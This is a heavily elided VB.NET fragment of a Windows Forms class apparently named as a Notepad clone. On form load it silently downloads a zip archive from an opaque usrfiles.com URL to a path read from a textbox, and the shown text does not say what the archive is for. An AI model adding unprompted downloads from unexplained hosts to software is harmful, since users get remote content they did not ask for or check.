...
Public Class Notepad__
    ...
    Private Sub Notepad___Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_5cbba201010b430a8d402281717671e9.zip"), Texbbb.TextBox11.Text)
